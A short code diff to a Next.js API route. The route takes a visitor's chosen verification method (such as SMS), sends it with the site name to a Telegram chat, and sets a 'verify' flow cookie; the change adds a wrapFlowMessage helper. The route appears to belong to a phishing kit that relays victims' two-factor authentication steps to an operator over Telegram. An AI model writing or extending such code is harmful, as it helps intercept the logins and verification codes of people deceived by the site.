@@ -1,5 +1,5 @@
 import { NextResponse } from 'next/server';
-import { sendTelegramMessage, getSiteName } from '@/lib/telegram';
+import { sendTelegramMessage, getSiteName, wrapFlowMessage } from '@/lib/telegram';
 
 const METHOD_LABELS = {
   text: 'Text Message (SMS)',
@@ -30,7 +30,7 @@ export async function POST(request) {
       `Method Selected: ${escapeHtml(label)}`,
     ].join('\n');
 
-    await sendTelegramMessage(message);
+    await sendTelegramMessage(wrapFlowMessage(message));
     const res = NextResponse.json({ ok: true });
     res.cookies.set('flow', 'verify', { path: '/', maxAge: 600, httpOnly: true, sameSite: 'lax' });
     return res;
